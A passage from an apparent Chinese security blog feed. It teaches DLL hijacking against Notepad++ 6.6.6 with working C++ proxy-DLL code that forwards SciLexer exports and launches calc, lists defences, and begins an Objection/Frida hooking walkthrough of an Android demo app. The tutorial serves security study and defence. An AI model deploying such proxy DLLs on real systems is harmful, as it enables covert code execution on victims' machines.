Directory）；</li><li>系统目录（通过 GetSystemDirectory 获取）；</li><li>16位系统目录；</li><li>Windows目录（通过 GetWindowsDirectory 获取）；</li><li>PATH环境变量中的各个目录；</li></ol><p>在<code>Windows XP SP2</code>之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启），默认注册表为：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code>，其键值为1，此时调用顺序如下：</p><ol><li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</li><li>系统目录（即%windir%system32）；</li><li>16位系统目录（即%windir%system）；</li><li>Windows目录（即%windir%）；</li><li>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</li><li>PATH环境变量中的各个目录；</li></ol><p>而在Windows7及以上，系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：在HKLM的如下目录中</p><p><code>SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p><p>Win10中如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129162728524.png" alt="image-20230129162728524"></p><p>同样，我们在WIN7的测试系统中也存在这个选项</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129162827261.png" alt="image-20230129162827261"></p><h1 id="4-DLL劫持漏洞分析"><a href="#4-DLL劫持漏洞分析" class="headerlink" title="4.DLL劫持漏洞分析"></a>4.DLL劫持漏洞分析</h1><blockquote><p>上文已经写明了DLL漏洞的成因，对dll劫持主要检测目录里的一些调用情况，通过一些监控软件，例如procmon，procmon全称为Process Monitor ，是一款能够实时显示文件系统、注册表与进程活动的高级工具，是微软推荐的一个系统监视工具。它整合了旧的 Sysinternals 工具，Filemon 与 Regmon，并增加了进程ID、用户、进程可靠度、等等监视项，可以记录到文件中。它的强大功能足以使 Process Monitor 成为你系统中的核心组件以及病毒探测工具。通常在病毒分析中会使用这个工具来监控软件的各种行为，同样也可以使用一些其他的行为监控软件来分析软件的行为，从而确定哪个dll可以劫持。</p></blockquote><h2 id="劫持应用中没有的dll"><a href="#劫持应用中没有的dll" class="headerlink" title="劫持应用中没有的dll"></a>劫持应用中没有的dll</h2><p>这里dll劫持的选用的是notepad++,使用的版本为6.6.6</p><p>下载：<a href="https://notepad-plus-plus.org/downloads/v6.6.6/">notepad++ v6.6.6</a></p><p>打开Process Monitor，设置几个过滤条件后，启动notepad</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129164531217.png" alt="image-20230129164531217"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129164518707.png" alt="image-20230129164518707"></p><blockquote><p><code>LoadLibrary</code>和<code>LoadLibraryEx</code>一个是本地加载，一个是远程加载，如果DLL不在调用的同一目录下，就可以使用<code>LoadLibrary(L&quot;DLL绝对路径&quot;)</code>加载。但是如果DLL内部又调用一个DLL，就需要使用<code>LoadLibraryEx</code>进行远程加载，语法如下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);</span><br></pre></td></tr></table></figure><p><code>LoadLibraryEx</code>的最后一个参数设置为<code>LOAD_WITH_ALTERED_SEARCH_PATH</code>即可让系统dll搜索顺序从我们设置的目录开始</p></blockquote><p>打开VS2022创建一个动态链接库</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129165326378.png" alt="image-20230129165326378"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并复制到NotePad++目录下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129165659940.png" alt="image-20230129165659940"></p><p>启动Notepad++</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129171953319.png" alt="image-20230129171953319"></p><h2 id="劫持应用中存在的dll"><a href="#劫持应用中存在的dll" class="headerlink" title="劫持应用中存在的dll"></a>劫持应用中存在的dll</h2><p>修改条件为<code>Result is SUCCESS</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129173831019.png" alt="image-20230129173831019"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129173956888.png" alt="image-20230129173956888"></p><p>在动态调用的时候，一般代码通过loadlibrary去加载dll 并作为参数传到到导出函数，这里看一下导入表，发现他这里有一个导出函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129174446670.png" alt="image-20230129174446670"></p><p>编写dll如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Scintilla_DirectFunction()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;calc.exe&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后放到notepad++目录</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130093827867.png" alt="image-20230130093827867"></p><p>运行发现报错，同时并没有弹出计算器</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130093921730.png" alt="image-20230130093921730"></p><p>这边我们使用dll进行转发，再生成一个恶意的dll执行代码，代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line"># include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        system(&quot;calc&quot;);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Scintilla_DirectFunction()</span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hDll &#x3D; LoadLibrary(L&quot;SciLexer_org.dll&quot;);</span><br><span class="line">    if (hDll)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;typedef 是定义了一个新的类型</span><br><span class="line">        &#x2F;&#x2F;DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD</span><br><span class="line">        &#x2F;&#x2F;定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针</span><br><span class="line">        typedef DWORD(WINAPI* EXPFUNC)();</span><br><span class="line">        EXPFUNC expFunc &#x3D; NULL;</span><br><span class="line">        expFunc &#x3D; (EXPFUNC)GetProcAddress(hDll, &quot;Scintilla_DirectFunction&quot;);</span><br><span class="line">        if (expFunc)</span><br><span class="line">        &#123;</span><br><span class="line">            expFunc();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换并将原DLL修改为<code>SciLexer_org.dll</code> 即可触发</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130095024990.png" alt="image-20230130095024990"></p><h2 id="使用工具进行劫持"><a href="#使用工具进行劫持" class="headerlink" title="使用工具进行劫持"></a>使用工具进行劫持</h2><p>使用CFF_EXPLORER、Process Explorer、Windbg来查找加载DLL,</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130170504078.png" alt="image-20230130170504078"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130170622223.png" alt="image-20230130170622223"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130171026673.png" alt="image-20230130171026673"></p><p>找一个不在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。</p><p>确定DLL后可以直接使用<code>Alternate DLL Analyzer</code>分析导出函数。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130172201291.png" alt="image-20230130172201291"></p><p>同时使用<code>AheadLib</code>生成转发DLL的CPP文件即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130172329886.png" alt="image-20230130172329886"></p><p>我们可以直接在VS2019中创建动态链接库并加入我们想要执行的命令即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line"># include &quot;pch.h&quot;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 导出函数</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;SciLexerOrg.Scintilla_DirectFunction,@1&quot;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 入口函数</span><br><span class="line">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class="line">&#123;</span><br><span class="line">if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line">system(&#39;calc&#39;);</span><br><span class="line">DisableThreadLibraryCalls(hModule);</span><br><span class="line">&#125;</span><br><span class="line">else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译替换运行即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130172756059.png" alt="image-20230130172756059"></p><h2 id="部分自动化工具"><a href="#部分自动化工具" class="headerlink" title="部分自动化工具"></a>部分自动化工具</h2><p>目前使用效果都不是很好，更多的还是需要手工分析。</p><p><a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130175427781.png" alt="image-20230130175427781"></p><p><a href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230130175307769.png" alt="image-20230130175307769"></p><h1 id="5-如何防御"><a href="#5-如何防御" class="headerlink" title="5.如何防御"></a>5.如何防御</h1><ol><li>在加载DLL时尽量使用DLL的绝对路径；</li><li>调用SetDllDirectory(L””)把 当前目录 从DLL搜索目录中排除；</li><li>使用 LoadLibraryEx 加载DLL时，指定 LOADLIBRARY_SEARCH 系列标志；</li><li>此外，进程也可以尝试去验证DLL的合法性，例如是否具有自家的合法数字签名、是否是合法的系统DLL文件等。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-DLL是什么&quot;&gt;&lt;a href=&quot;#1-DLL是什么&quot; class=&quot;headerlink&quot; title=&quot;1.DLL是什么&quot;&gt;&lt;/a&gt;1.DLL是什么&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;DLL是Dynamic Link Library的缩写，意为动态链接库。在Windows中，许多应用程序并不是一个完整的&lt;a href=&quot;https://baike.baidu.com/item/可执行文件?fromModule=lemma_inlink&quot;&gt;可执行文件&lt;/a&gt;，它们被分割成一些相对独立的动态链接库，即&lt;a href=&quot;https://baike.baidu.com/item/DLL文件?fromModule=lemma_inlink&quot;&gt;DLL文件&lt;/a&gt;，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可有多个DLL文件，一个DLL文件也可能被几个应用程序所共用，这样的DLL文件被称为共享DLL文件。&lt;/p&gt;
&lt;p&gt;1．静态调用方式：由&lt;a href=&quot;https://baike.baidu.com/item/编译系统?fromModule=lemma_inlink&quot;&gt;编译系统&lt;/a&gt;完成对 DLL 的加载和应用程序结束时 DLL &lt;a href=&quot;https://baike.baidu.com/item/卸载?fromModule=lemma_inlink&quot;&gt;卸载&lt;/a&gt;的编码（如还有其它程序使用该 DLL，则 Windows 对 DLL 的应用记录减1，直到所有相关程序都结束对该 DLL 的使用时才释放它，简单实用，但不够灵活，只能满足一般要求。&lt;/p&gt;
&lt;p&gt;2．动态调用方式：是由编程者用 API 函数加载和&lt;a href=&quot;https://baike.baidu.com/item/卸载?fromModule=lemma_inlink&quot;&gt;卸载&lt;/a&gt; DLL 来达到调用 DLL 的目的，使用上较复杂，但能更加有效地使用内存，是编制大型应用程序时的重要方式。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="DLL劫持" scheme="http://www.ol4three.com/tags/DLL%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>objectioin实战详解</title>
    <link href="http://www.ol4three.com/2022/04/12/Android/objectioin%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ol4three.com/2022/04/12/Android/objectioin%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-04-12T07:15:36.000Z</published>
    <updated>2023-01-29T06:24:44.762Z</updated>
    
    <content type="html"><![CDATA[<p>接上篇，上篇对Objection的常用使用方法进行了总结，同时也找到两个APK进行练习测试。</p><blockquote><p>文章中使用的APK以及脚本可以在此处进行下载 <a href="https://github.com/OL4THREE/Practice-Note">Demo下载</a></p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png" alt="objection.png"></p><a id="more"></a><h2 id="Junior"><a href="#Junior" class="headerlink" title="Junior"></a>Junior</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida, objection等版本可见上篇</span><br><span class="line"># 测试环境</span><br><span class="line">Mac OS 12.3</span><br><span class="line">Kali 2022</span><br><span class="line">Nexus 6P</span><br><span class="line">MUMU模拟器</span><br><span class="line">&#x2F;&#x2F; 安装</span><br><span class="line">╰─$ adb install -t junior.apk</span><br><span class="line">Performing Push Install</span><br><span class="line">junior.apk: 1 file pushed, 0 skipped. 16.1 MB&#x2F;s (2347060 bytes in 0.139s)</span><br><span class="line">pkg: &#x2F;data&#x2F;local&#x2F;tmp&#x2F;junior.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure><p>源代码地址: <a href="https://github.com/aqi00/android2">Junior</a></p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128154133320.png" alt="image-20230128154133320" style="zoom:50%;"><p>安装成功后首先使用Objection 遍历一下App的所有Activity</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection -g com.example.junior explore -P ~&#x2F;.objection&#x2F;plugins</span><br><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android hooking list activities</span><br><span class="line">com.example.junior.BbsActivity</span><br><span class="line">com.example.junior.CalculatorActivity</span><br><span class="line">com.example.junior.CaptureActivity</span><br><span class="line">com.example.junior.ClickActivity</span><br><span class="line">com.example.junior.ColorActivity</span><br><span class="line">com.example.junior.GravityActivity</span><br><span class="line">com.example.junior.IconActivity</span><br><span class="line">com.example.junior.MainActivity</span><br><span class="line">com.example.junior.MarginActivity</span><br><span class="line">com.example.junior.MarqueeActivity</span><br><span class="line">com.example.junior.NineActivity</span><br><span class="line">com.example.junior.PxActivity</span><br><span class="line">com.example.junior.ScaleActivity</span><br><span class="line">com.example.junior.ScreenActivity</span><br><span class="line">com.example.junior.ScrollActivity</span><br><span class="line">com.example.junior.ShapeActivity</span><br><span class="line">com.example.junior.StateActivity</span><br><span class="line"></span><br><span class="line">Found 17 classes</span><br></pre></td></tr></table></figure><p>我们启动其计算器功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android intent launch_activity com.example.junior.CalculatorActivity</span><br><span class="line">(agent) Starting activity com.example.junior.CalculatorActivity...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128160517143.png" alt="image-20230128160517143" style="zoom:50%;" div align="center/"><h3 id="OnCreate"><a href="#OnCreate" class="headerlink" title="OnCreate()"></a>OnCreate()</h3><p>查看CalculatorActivity.java的onCreate函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128160926754.png" alt="image-20230128160926754"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_calculator);</span><br><span class="line">    &#x2F;&#x2F; 从布局文件中获取名叫tv_result的文本视图</span><br><span class="line">    tv_result &#x3D; findViewById(R.id.tv_result);</span><br><span class="line">    &#x2F;&#x2F; 设置tv_result内部文本的移动方式为滚动形式</span><br><span class="line">    tv_result.setMovementMethod(new ScrollingMovementMethod());</span><br><span class="line">    &#x2F;&#x2F; 下面给每个按钮控件都注册了点击监听器</span><br><span class="line">    findViewById(R.id.btn_cancel).setOnClickListener(this); &#x2F;&#x2F; “取消”按钮</span><br><span class="line">    findViewById(R.id.btn_divide).setOnClickListener(this); &#x2F;&#x2F; “除法”按钮</span><br><span class="line">    findViewById(R.id.btn_multiply).setOnClickListener(this); &#x2F;&#x2F; “乘法”按钮</span><br><span class="line">    findViewById(R.id.btn_clear).setOnClickListener(this); &#x2F;&#x2F; “清除”按钮</span><br><span class="line">    findViewById(R.id.btn_seven).setOnClickListener(this); &#x2F;&#x2F; 数字7</span><br><span class="line">    findViewById(R.id.btn_eight).setOnClickListener(this); &#x2F;&#x2F; 数字8</span><br><span class="line">    findViewById(R.id.btn_nine).setOnClickListener(this); &#x2F;&#x2F; 数字9</span><br><span class="line">    findViewById(R.id.btn_plus).setOnClickListener(this); &#x2F;&#x2F; “加法”按钮</span><br><span class="line">    findViewById(R.id.btn_four).setOnClickListener(this); &#x2F;&#x2F; 数字4</span><br><span class="line">    findViewById(R.id.btn_five).setOnClickListener(this); &#x2F;&#x2F; 数字5</span><br><span class="line">    findViewById(R.id.btn_six).setOnClickListener(this); &#x2F;&#x2F; 数字6</span><br><span class="line">    findViewById(R.id.btn_minus).setOnClickListener(this); &#x2F;&#x2F; “减法”按钮</span><br><span class="line">    findViewById(R.id.btn_one).setOnClickListener(this); &#x2F;&#x2F; 数字1</span><br><span class="line">    findViewById(R.id.btn_two).setOnClickListener(this); &#x2F;&#x2F; 数字2</span><br><span class="line">    findViewById(R.id.btn_three).setOnClickListener(this); &#x2F;&#x2F; 数字3</span><br><span class="line">    findViewById(R.id.btn_zero).setOnClickListener(this); &#x2F;&#x2F; 数字0</span><br><span class="line">    findViewById(R.id.btn_dot).setOnClickListener(this); &#x2F;&#x2F; “小数点”按钮</span><br><span class="line">    findViewById(R.id.btn_equal).setOnClickListener(this); &#x2F;&#x2F; “等号”按钮</span><br><span class="line">    findViewById(R.id.ib_sqrt).setOnClickListener(this); &#x2F;&#x2F; “开平方”按钮</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试这个计算机之后回发现，每次按“等号”按钮后计算结果都会被打印出来。根据这一现象，找到对应的点击响应函数<code>onClick()</code>函数中属于“等号”按钮的源码部分，最终的源码如下</p><h3 id="OnClick"><a href="#OnClick" class="headerlink" title="OnClick()"></a>OnClick()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void onClick(View v) &#123;</span><br><span class="line">    int resid &#x3D; v.getId(); &#x2F;&#x2F; 获得当前按钮的编号</span><br><span class="line">    String inputText;</span><br><span class="line">    if (resid &#x3D;&#x3D; R.id.ib_sqrt) &#123; &#x2F;&#x2F; 如果是开根号按钮</span><br><span class="line">        inputText &#x3D; &quot;√&quot;;</span><br><span class="line">    &#125; else &#123; &#x2F;&#x2F; 除了开根号按钮之外的其它按钮</span><br><span class="line">        inputText &#x3D; ((TextView) v).getText().toString();</span><br><span class="line">    &#125;</span><br><span class="line">    Log.d(TAG, &quot;resid&#x3D;&quot; + resid + &quot;,inputText&#x3D;&quot; + inputText);</span><br><span class="line">    if (resid &#x3D;&#x3D; R.id.btn_clear) &#123; &#x2F;&#x2F; 点击了清除按钮</span><br><span class="line">        clear(&quot;&quot;);</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.btn_cancel) &#123; &#x2F;&#x2F; 点击了取消按钮</span><br><span class="line">        if (operator.equals(&quot;&quot;)) &#123; &#x2F;&#x2F; 无操作符，则表示逐位取消前一个操作数</span><br><span class="line">            if (firstNum.length() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                firstNum &#x3D; &quot;0&quot;;</span><br><span class="line">            &#125; else if (firstNum.length() &gt; 0) &#123;</span><br><span class="line">                firstNum &#x3D; firstNum.substring(0, firstNum.length() - 1);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Toast.makeText(this, &quot;没有可取消的数字了&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            showText &#x3D; firstNum;</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 有操作符，则表示逐位取消后一个操作数</span><br><span class="line">            if (nextNum.length() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                nextNum &#x3D; &quot;&quot;;</span><br><span class="line">            &#125; else if (nextNum.length() &gt; 0) &#123;</span><br><span class="line">                nextNum &#x3D; nextNum.substring(0, nextNum.length() - 1);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Toast.makeText(this, &quot;没有可取消的数字了&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            showText &#x3D; showText.substring(0, showText.length() - 1);</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.btn_equal) &#123; &#x2F;&#x2F; 点击了等号按钮</span><br><span class="line">        if (operator.length() &#x3D;&#x3D; 0 || operator.equals(&quot;＝&quot;)) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入运算符&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125; else if (nextNum.length() &lt;&#x3D; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (caculate()) &#123; &#x2F;&#x2F; 计算成功，则显示计算结果</span><br><span class="line">            operator &#x3D; inputText;</span><br><span class="line">            showText &#x3D; showText + &quot;&#x3D;&quot; + result;</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 计算失败，则直接返回</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.btn_plus || resid &#x3D;&#x3D; R.id.btn_minus &#x2F;&#x2F; 点击了加、减、乘、除按钮</span><br><span class="line">            || resid &#x3D;&#x3D; R.id.btn_multiply || resid &#x3D;&#x3D; R.id.btn_divide) &#123;</span><br><span class="line">        if (firstNum.length() &lt;&#x3D; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (operator.length() &#x3D;&#x3D; 0 || operator.equals(&quot;＝&quot;) || operator.equals(&quot;√&quot;)) &#123;</span><br><span class="line">            operator &#x3D; inputText; &#x2F;&#x2F; 操作符</span><br><span class="line">            showText &#x3D; showText + operator;</span><br><span class="line">            tv_result.setText(showText);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (resid &#x3D;&#x3D; R.id.ib_sqrt) &#123; &#x2F;&#x2F; 点击了开根号按钮</span><br><span class="line">        if (firstNum.length() &lt;&#x3D; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;请输入数字&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (Double.parseDouble(firstNum) &lt; 0) &#123;</span><br><span class="line">            Toast.makeText(this, &quot;开根号的数值不能小于0&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 进行开根号运算</span><br><span class="line">        result &#x3D; String.valueOf(Math.sqrt(Double.parseDouble(firstNum)));</span><br><span class="line">        firstNum &#x3D; result;</span><br><span class="line">        nextNum &#x3D; &quot;&quot;;</span><br><span class="line">        operator &#x3D; inputText;</span><br><span class="line">        showText &#x3D; showText + &quot;√&#x3D;&quot; + result;</span><br><span class="line">        tv_result.setText(showText);</span><br><span class="line">        Log.d(TAG, &quot;result&#x3D;&quot; + result + &quot;,firstNum&#x3D;&quot; + firstNum + &quot;,operator&#x3D;&quot; + operator);</span><br><span class="line">    &#125; else &#123; &#x2F;&#x2F; 点击了其它按钮，包括数字和小数点</span><br><span class="line">        if (operator.equals(&quot;＝&quot;)) &#123; &#x2F;&#x2F; 上一次点击了等号按钮，则清空操作符</span><br><span class="line">            operator &#x3D; &quot;&quot;;</span><br><span class="line">            firstNum &#x3D; &quot;&quot;;</span><br><span class="line">            showText &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (resid &#x3D;&#x3D; R.id.btn_dot) &#123; &#x2F;&#x2F; 点击了小数点</span><br><span class="line">            inputText &#x3D; &quot;.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (operator.equals(&quot;&quot;)) &#123; &#x2F;&#x2F; 无操作符，则继续拼接前一个操作数</span><br><span class="line">            if (firstNum.contains(&quot;.&quot;) &amp;&amp; inputText.equals(&quot;.&quot;)) &#123;</span><br><span class="line">                return; &#x2F;&#x2F; 一个数字不能有两个小数点</span><br><span class="line">            &#125;</span><br><span class="line">            firstNum &#x3D; firstNum + inputText;</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 有操作符，则继续拼接后一个操作数</span><br><span class="line">            if (nextNum.contains(&quot;.&quot;) &amp;&amp; inputText.equals(&quot;.&quot;)) &#123;</span><br><span class="line">                return; &#x2F;&#x2F; 一个数字不能有两个小数点</span><br><span class="line">            &#125;</span><br><span class="line">            nextNum &#x3D; nextNum + inputText;</span><br><span class="line">        &#125;</span><br><span class="line">        showText &#x3D; showText + inputText;</span><br><span class="line">        tv_result.setText(showText);</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>btn_equal</code>主要是在<code>caculate()</code>函数中 接下来我们使用objection来验证一下是否存在caculate()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android hooking list class_methods com.example.junior.CalculatorActivity</span><br><span class="line">private boolean com.example.junior.CalculatorActivity.caculate()</span><br><span class="line">private void com.example.junior.CalculatorActivity.clear(java.lang.String)</span><br><span class="line">protected void 